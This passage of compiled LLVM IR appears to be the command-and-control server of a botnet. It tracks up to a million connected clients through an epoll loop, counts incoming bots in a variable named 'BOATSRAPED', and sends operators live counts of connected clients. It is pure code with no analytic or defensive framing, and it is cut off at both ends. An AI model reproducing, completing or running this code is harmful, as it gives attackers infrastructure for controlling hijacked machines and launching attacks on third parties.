  call void @removestr(i8* nonnull %11, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %52 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %46, i32 2, i64 0
  %53 = call i8* @strcpy(i8* %52, i8* nonnull %11) #10
  br label %56

; <label>:54:                                     ; preds = %62
  %55 = icmp slt i64 %indvars.iv.next, 40
  br i1 %55, label %56, label %.preheader.preheader.loopexit

; <label>:56:                                     ; preds = %51, %54
  %indvars.iv = phi i64 [ 0, %51 ], [ %indvars.iv.next, %54 ]
  %57 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 0, i64 0
  %58 = call i32 @strcmp(i8* %57, i8* nonnull %11) #9
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %62

; <label>:60:                                     ; preds = %56
  %61 = call i32 @usleep(i32 40000) #10
  br label %.preheader.preheader

; <label>:62:                                     ; preds = %56
  %63 = call i64 @strlen(i8* %57) #9
  %64 = icmp eq i64 %63, 0
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %64, label %65, label %54

; <label>:65:                                     ; preds = %62
  %66 = call i8* @strcpy(i8* %57, i8* nonnull %11) #10
  br label %.preheader.preheader

.preheader.preheader.loopexit:                    ; preds = %54
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %.preheader.preheader.loopexit, %.lr.ph83, %60, %65
  %67 = zext i32 %44 to i64
  br label %.preheader

.preheader:                                       ; preds = %148, %.preheader.preheader
  %indvars.iv100 = phi i64 [ 0, %.preheader.preheader ], [ %indvars.iv.next101.1, %148 ]
  %68 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv100, i32 3
  %69 = load i8, i8* %68, align 1
  %70 = icmp eq i8 %69, 0
  %71 = icmp eq i64 %indvars.iv100, %67
  %or.cond61 = or i1 %71, %70
  br i1 %or.cond61, label %.preheader.1128, label %72

; <label>:72:                                     ; preds = %.preheader
  %73 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv100, i32 0
  %74 = load i32, i32* %73, align 8
  %75 = load i32, i32* %47, align 4
  %76 = icmp eq i32 %74, %75
  br i1 %76, label %81, label %.preheader.1128

.preheader.1128:                                  ; preds = %.preheader, %72
  %indvars.iv.next101 = or i64 %indvars.iv100, 1
  %77 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next101, i32 3
  %78 = load i8, i8* %77, align 1
  %79 = icmp eq i8 %78, 0
  %80 = icmp eq i64 %indvars.iv.next101, %67
  %or.cond61.1 = or i1 %80, %79
  br i1 %or.cond61.1, label %148, label %143

; <label>:81:                                     ; preds = %143, %72
  %82 = call i64 @send(i32 %44, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i64 8, i32 16384) #10
  %83 = call i32 @close(i32 %44) #10
  br label %.backedge65

.critedge62:                                      ; preds = %148
  %84 = call fastcc i32 @make_socket_non_blocking(i32 %44)
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %88

; <label>:86:                                     ; preds = %.critedge62
  %87 = call i32 @close(i32 %44) #10
  br label %141

; <label>:88:                                     ; preds = %.critedge62
  store i32 %44, i32* %13, align 4
  store i32 -2147483647, i32* %14, align 4
  %89 = load volatile i32, i32* @epollFD, align 4
  %90 = call i32 @epoll_ctl(i32 %89, i32 1, i32 %44, %struct.epoll_event* nonnull %2) #10
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %94

; <label>:92:                                     ; preds = %88
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  %93 = call i32 @close(i32 %44) #10
  br label %141

; <label>:94:                                     ; preds = %88
  %95 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %46, i32 3
  store i8 1, i8* %95, align 1
  br label %.backedge65

.backedge65:                                      ; preds = %94, %81
  store i32 16, i32* %4, align 4
  %96 = load volatile i32, i32* @listenFD, align 4
  %97 = call i32 @accept(i32 %96, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %98 = icmp eq i32 %97, -1
  br i1 %98, label %._crit_edge.loopexit, label %.lr.ph83

; <label>:99:                                     ; preds = %31
  %100 = sext i32 %35 to i64
  %101 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %100, i32 3
  store i8 1, i8* %101, align 1
  br label %102

; <label>:102:                                    ; preds = %.critedge, %99
  %.052 = phi i32 [ 0, %99 ], [ %.153, %.critedge ]
  call void @llvm.memset.p0i8.i64(i8* nonnull %15, i8 0, i64 2048, i32 16, i1 false)
  %103 = call i32 @fdgets(i8* nonnull %9, i32 2048, i32 %35)
  %104 = sext i32 %103 to i64
  %105 = icmp sgt i32 %103, 0
  br i1 %105, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %102
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %106 = phi i64 [ %118, %.backedge ], [ %104, %.lr.ph.preheader ]
  %strchr = call i8* @strchr(i8* nonnull %9, i32 10)
  %107 = icmp eq i8* %strchr, null
  br i1 %107, label %.critedge.loopexit, label %108

; <label>:108:                                    ; preds = %.lr.ph
  call void @trim(i8* nonnull %9)
  %109 = call i8* @strstr(i8* nonnull %9, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0)) #9
  %110 = icmp eq i8* %109, %9
  br i1 %110, label %111, label %120

; <label>:111:                                    ; preds = %108
  %112 = getelementptr inbounds i8, i8* %109, i64 7
  %113 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %114 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %113, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i8* %112)
  %115 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %116 = call i32 @fflush(%struct._IO_FILE* %115)
  br label %.backedge

.backedge:                                        ; preds = %111, %121, %133, %127, %130
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 2048, i32 16, i1 false)
  %117 = call i32 @fdgets(i8* nonnull %9, i32 2048, i32 %35)
  %118 = sext i32 %117 to i64
  %119 = icmp sgt i32 %117, 0
  br i1 %119, label %.lr.ph, label %.critedge.loopexit

; <label>:120:                                    ; preds = %108
  %strncmp = call i32 @strncmp(i8* nonnull %9, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0), i64 10)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %121, label %124

; <label>:121:                                    ; preds = %120
  %122 = load volatile i32, i32* @BOATSRAPED, align 4
  %123 = add nsw i32 %122, 1
  store volatile i32 %123, i32* @BOATSRAPED, align 4
  br label %.backedge

; <label>:124:                                    ; preds = %120
  %125 = call i32 @strcmp(i8* nonnull %9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %126 = icmp eq i32 %125, 0
  br i1 %126, label %127, label %130

; <label>:127:                                    ; preds = %124
  %128 = call i64 @send(i32 %35, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i64 5, i32 16384) #10
  %129 = icmp eq i64 %128, -1
  br i1 %129, label %.critedge.loopexit, label %.backedge

; <label>:130:                                    ; preds = %124
  %131 = call i32 @strcmp(i8* nonnull %9, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0)) #9
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %.backedge, label %133

; <label>:133:                                    ; preds = %130
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0), i8* nonnull %9)
  br label %.backedge

.critedge.loopexit:                               ; preds = %127, %.lr.ph, %.backedge
  %.lcssa.ph = phi i64 [ %106, %127 ], [ %106, %.lr.ph ], [ %118, %.backedge ]
  %.153.ph = phi i32 [ 1, %127 ], [ 1, %.lr.ph ], [ %.052, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %102
  %.lcssa = phi i64 [ %104, %102 ], [ %.lcssa.ph, %.critedge.loopexit ]
  %.153 = phi i32 [ %.052, %102 ], [ %.153.ph, %.critedge.loopexit ]
  switch i64 %.lcssa, label %102 [
    i64 -1, label %135
    i64 0, label %.thread.loopexit
  ]

; <label>:135:                                    ; preds = %.critedge
  %136 = tail call i32* @__errno_location() #11
  %137 = load i32, i32* %136, align 4
  %138 = icmp eq i32 %137, 11
  %139 = icmp eq i32 %.153, 0
  %or.cond63 = and i1 %139, %138
  br i1 %or.cond63, label %141, label %.thread

.thread.loopexit:                                 ; preds = %.critedge
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit, %135
  store i8 0, i8* %101, align 1
  %140 = call i32 @close(i32 %35) #10
  br label %141

; <label>:141:                                    ; preds = %135, %.thread, %43, %86, %92, %._crit_edge, %24
  %indvars.iv.next103 = add nuw nsw i64 %indvars.iv102, 1
  %142 = icmp slt i64 %indvars.iv.next103, %19
  br i1 %142, label %.lr.ph88, label %.loopexit.outer.loopexit

; <label>:143:                                    ; preds = %.preheader.1128
  %144 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next101, i32 0
  %145 = load i32, i32* %144, align 4
  %146 = load i32, i32* %47, align 4
  %147 = icmp eq i32 %145, %146
  br i1 %147, label %81, label %148

; <label>:148:                                    ; preds = %143, %.preheader.1128
  %indvars.iv.next101.1 = add nsw i64 %indvars.iv100, 2
  %149 = icmp slt i64 %indvars.iv.next101.1, 1000000
  br i1 %149, label %.preheader, label %.critedge62
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #4

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #3

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #4

declare i32 @usleep(i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @make_socket_non_blocking(i32) unnamed_addr #0 {
  %2 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i32 0) #10
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i64 0, i64 0)) #12
  br label %10

; <label>:5:                                      ; preds = %1
  %6 = or i32 %2, 2048
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i32 %6) #10
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %10

; <label>:9:                                      ; preds = %5
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i64 0, i64 0)) #12
  br label %10

; <label>:10:                                     ; preds = %5, %9, %4
  %.0 = phi i32 [ -1, %4 ], [ -1, %9 ], [ 0, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fprintf(%struct._IO_FILE* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fflush(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #4

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @clientsConnected() local_unnamed_addr #7 {
  br label %1

; <label>:1:                                      ; preds = %1, %0
  %indvars.iv = phi i64 [ 0, %0 ], [ %indvars.iv.next.4, %1 ]
  %.07 = phi i32 [ 0, %0 ], [ %.0..4, %1 ]
  %2 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 3
  %3 = load i8, i8* %2, align 1
  %not. = icmp ne i8 %3, 0
  %4 = zext i1 %not. to i32
  %.0. = add nsw i32 %4, %.07
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %5 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next, i32 3
  %6 = load i8, i8* %5, align 1
  %not..1 = icmp ne i8 %6, 0
  %7 = zext i1 %not..1 to i32
  %.0..1 = add nsw i32 %7, %.0.
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %8 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.1, i32 3
  %9 = load i8, i8* %8, align 1
  %not..2 = icmp ne i8 %9, 0
  %10 = zext i1 %not..2 to i32
  %.0..2 = add nsw i32 %10, %.0..1
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %11 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.2, i32 3
  %12 = load i8, i8* %11, align 1
  %not..3 = icmp ne i8 %12, 0
  %13 = zext i1 %not..3 to i32
  %.0..3 = add nsw i32 %13, %.0..2
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %14 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next.3, i32 3
  %15 = load i8, i8* %14, align 1
  %not..4 = icmp ne i8 %15, 0
  %16 = zext i1 %not..4 to i32
  %.0..4 = add nsw i32 %16, %.0..3
  %indvars.iv.next.4 = add nsw i64 %indvars.iv, 5
  %exitcond.4 = icmp eq i64 %indvars.iv.next.4, 1000000
  br i1 %exitcond.4, label %17, label %1

; <label>:17:                                     ; preds = %1
  ret i32 %.0..4
}

; Function Attrs: noinline nounwind uwtable
define i32 @joinn() local_unnamed_addr #0 {
.preheader.preheader23:
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 0, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 1, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 2, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 3, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 4, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 5, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 6, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 7, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 8, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 9, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 10, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 11, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 12, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 13, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 14, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 15, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 16, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 17, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 18, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 19, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 20, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 21, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 22, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 23, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 24, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 25, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 26, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 27, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 28, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 29, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 30, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 31, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 32, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 33, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 34, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 35, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 36, i32 1), align 16
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 37, i32 1), align 4
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 38, i32 1), align 8
  store i32 0, i32* getelementptr inbounds ([40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 39, i32 1), align 4
  br label %.preheader

.preheader:                                       ; preds = %14, %.preheader.preheader23
  %indvars.iv17 = phi i64 [ 0, %.preheader.preheader23 ], [ %indvars.iv.next18, %14 ]
  %0 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv17, i32 2, i64 0
  %1 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv17, i32 3
  br label %2

; <label>:2:                                      ; preds = %13, %.preheader
  %indvars.iv = phi i64 [ 0, %.preheader ], [ %indvars.iv.next, %13 ]
  %3 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 0, i64 0
  %4 = tail call i32 @strcmp(i8* %0, i8* %3) #9
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %13

; <label>:6:                                      ; preds = %2
  %7 = load i8, i8* %1, align 1
  %8 = icmp eq i8 %7, 1
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %6
  %10 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 1
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %10, align 4
  br label %13

; <label>:13:                                     ; preds = %2, %6, %9
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 40
  br i1 %exitcond, label %14, label %2

; <label>:14:                                     ; preds = %13
  %indvars.iv.next18 = add nuw nsw i64 %indvars.iv17, 1
  %exitcond19 = icmp eq i64 %indvars.iv.next18, 1000000
  br i1 %exitcond19, label %15, label %.preheader

; <label>:15:                                     ; preds = %14
  ret i32 undef
}

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [512 x i8], align 16
  %3 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %4 = icmp eq %struct._IO_FILE* %3, null
  br i1 %4, label %17, label %.preheader

.preheader:                                       ; preds = %1
  %5 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %6 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %7 = icmp eq i8* %6, null
  br i1 %7, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.015 = phi i32 [ %.0..011, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.0914 = phi i32 [ %.09., %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.01113 = phi i32 [ %11, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %8 = call i8* @strstr(i8* nonnull %5, i8* %0) #9
  %9 = icmp eq i8* %8, null
  %not. = xor i1 %9, true
  %10 = zext i1 %not. to i32
  %.09. = add nsw i32 %10, %.0914
  %.0..011 = select i1 %9, i32 %.015, i32 %.01113
  %11 = add nuw nsw i32 %.01113, 1
  %12 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %13 = icmp eq i8* %12, null
  br i1 %13, label %._crit_edge, label %.lr.ph

._crit_edge:                                      ; preds = %.lr.ph
  br i1 %4, label %15, label %._crit_edge.thread

._crit_edge.thread:                               ; preds = %.preheader, %._crit_edge
  %.0.lcssa19 = phi i32 [ %.0..011, %._crit_edge ], [ 0, %.preheader ]
  %.09.lcssa17 = phi i32 [ %.09., %._crit_edge ], [ 0, %.preheader ]
  %14 = call i32 @fclose(%struct._IO_FILE* nonnull %3)
  br label %15

; <label>:15:                                     ; preds = %._crit_edge, %._crit_edge.thread
  %.0.lcssa20 = phi i32 [ %.0..011, %._crit_edge ], [ %.0.lcssa19, %._crit_edge.thread ]
  %.09.lcssa18 = phi i32 [ %.09., %._crit_edge ], [ %.09.lcssa17, %._crit_edge.thread ]
  %16 = icmp eq i32 %.09.lcssa18, 0
  %..0 = select i1 %16, i32 0, i32 %.0.lcssa20
  br label %17

; <label>:17:                                     ; preds = %15, %1
  %.012 = phi i32 [ -1, %1 ], [ %..0, %15 ]
  ret i32 %.012
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) local_unnamed_addr #0 {
  %.sroa.0.4.extract.shift = lshr i64 %0, 32
  %.sroa.0.4.extract.trunc = trunc i64 %.sroa.0.4.extract.shift to i32
  %3 = and i32 %.sroa.0.4.extract.trunc, 255
  %4 = lshr i64 %0, 40
  %5 = trunc i64 %4 to i32
  %6 = and i32 %5, 255
  %7 = lshr i64 %0, 48
  %8 = trunc i64 %7 to i32
  %9 = and i32 %8, 255
  %10 = lshr i64 %0, 56
  %11 = trunc i64 %10 to i32
  %12 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0), i32 %3, i32 %6, i32 %9, i32 %11)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @hostname_to_ip(i8*, i8*) local_unnamed_addr #0 {
  %3 = tail call %struct.hostent* @gethostbyname(i8* %0) #10
  %4 = icmp eq %struct.hostent* %3, null
  br i1 %4, label %5, label %6

; <label>:5:                                      ; preds = %2
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i64 0, i64 0)) #10
  br label %17

; <label>:6:                                      ; preds = %2
  %7 = getelementptr inbounds %struct.hostent, %struct.hostent* %3, i64 0, i32 4
  %8 = bitcast i8*** %7 to %struct.in_addr***
  %9 = load %struct.in_addr**, %struct.in_addr*** %8, align 8
  %10 = load %struct.in_addr*, %struct.in_addr** %9, align 8
  %11 = icmp eq %struct.in_addr* %10, null
  br i1 %11, label %17, label %12

; <label>:12:                                     ; preds = %6
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %10, i64 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #10
  %16 = tail call i8* @strcpy(i8* %1, i8* %15) #10
  br label %17

; <label>:17:                                     ; preds = %6, %12, %5
  %.0 = phi i32 [ 1, %5 ], [ 0, %12 ], [ 1, %6 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void @herror(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @titleWriter(i8*) #6 {
  %2 = alloca [2048 x i8], align 16
  %3 = alloca [1000 x i8], align 16
  %4 = ptrtoint i8* %0 to i64
  %5 = trunc i64 %4 to i32
  %6 = getelementptr inbounds [1000 x i8], [1000 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 1000, i32 16, i1 false)
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %2, i64 0, i64 0
  br label %.loopexit.loopexit5

.loopexit.loopexit5:                              ; preds = %1, %.loopexit.loopexit5
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %8 = call i32 @clientsConnected()
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %10 = call i64 @strlen(i8* nonnull %7) #9
  %11 = call i64 @send(i32 %5, i8* nonnull %7, i64 %10, i32 16384) #10
  %12 = call i32 @sleep(i32 1) #10
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %13 = call i32 @clientsConnected()
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %13, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %15 = call i64 @strlen(i8* nonnull %7) #9
  %16 = call i64 @send(i32 %5, i8* nonnull %7, i64 %15, i32 16384) #10
  %17 = call i32 @sleep(i32 1) #10
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %18 = call i32 @clientsConnected()
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %20 = call i64 @strlen(i8* nonnull %7) #9
  %21 = call i64 @send(i32 %5, i8* nonnull %7, i64 %20, i32 16384) #10
  %22 = call i32 @sleep(i32 1) #10
  call void @llvm.memset.p0i8.i64(i8* nonnull %7, i8 0, i64 2048, i32 16, i1 false)
  %23 = call i32 @clientsConnected()
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %7, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 27, i32 %23, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i64 0, i64 0), i8* nonnull %6, i32 7) #10
  %25 = call i64 @strlen(i8* nonnull %7) #9
